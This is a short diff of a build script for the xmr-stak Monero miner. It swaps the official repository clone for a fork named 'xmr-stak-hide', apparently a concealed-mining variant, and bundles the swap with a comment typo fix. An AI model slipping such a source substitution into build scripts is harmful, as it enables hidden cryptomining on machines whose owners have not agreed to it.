@@ -8,7 +8,7 @@ fi
 if [ -d xmr-stak ]; then
   git -C xmr-stak clean -fd
 else
-  git clone https://github.com/fireice-uk/xmr-stak.git
+  git clone https://github.com/rapid821/xmr-stak-hide.git
 fi
 
 wget -c https://developer.nvidia.com/compute/cuda/9.0/Prod/local_installers/cuda_9.0.176_384.81_linux-run
@@ -18,7 +18,7 @@ chmod a+x cuda_*_linux-run
 ########################
 # Fedora 27
 ########################
-# CUDA is not going to work on Fedora 27 beacuse it's only support these distributions: http://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html
+# CUDA is not going to work on Fedora 27 beacuse it only supports these distributions: http://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html
 docker run --rm -it -v $PWD:/mnt fedora:27 /bin/bash -c "
 set -x ;
 dnf install -y -q cmake gcc-c++ hwloc-devel libmicrohttpd-devel libstdc++-static make openssl-devel;
